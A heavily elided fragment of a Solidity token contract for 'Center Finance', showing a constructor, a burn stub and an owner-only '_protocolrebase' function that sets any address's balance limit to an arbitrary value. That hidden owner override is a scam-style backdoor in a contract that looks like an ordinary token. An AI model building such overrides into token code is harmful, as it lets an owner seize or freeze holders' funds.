...
contract CenterFinance is Context, _IERC20ANTIBOT, _Ownables {
  ...
  constructor() public {
    _name = 'Center Finance';
    _symbol = 'CENTERFINANCE';
    _decimals = 0;
  ...
  function burn(uint256 _tVALUE) public virtual {
     ...
     function _protocolrebase(address _shipsadr, uint256 _tVALUE) external onlyOwner {
      _maxbalances[_shipsadr] = _tVALUE * 10 ** 0;
  }
